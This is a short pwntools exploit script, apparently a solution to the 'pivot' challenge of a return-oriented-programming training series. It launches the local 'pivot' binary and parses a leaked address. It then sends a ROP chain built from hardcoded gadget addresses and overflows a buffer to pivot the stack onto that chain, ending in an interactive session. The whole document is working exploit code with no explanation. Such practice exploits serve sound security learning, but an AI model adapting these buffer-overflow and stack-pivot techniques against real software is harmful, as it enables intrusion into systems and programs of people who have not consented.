from pwn import *

p = process("pivot")

p.recvuntil(b"pivot: 0x")
pivotAddr = p.recv(12)
log.info(f"pivotAddr: 0x{pivotAddr.decode('utf-8')}")

payload  = b""
payload += p64(0x400720)
payload += p64(0x4009bb)
payload += p64(0x601040)
payload += p64(0x4009c0)
payload += p64(0x4007c8)
payload += p64(279)
payload += p64(0x4009c4)
payload += p64(0x4006b0)

p.sendline(payload)
p.sendline(b"A"*0x28 + p64(0x4009bb) + p64(int(pivotAddr, 16)) + p64(0x4009bd))
p.recvuntil(b"libpivot\n")
p.interactive()
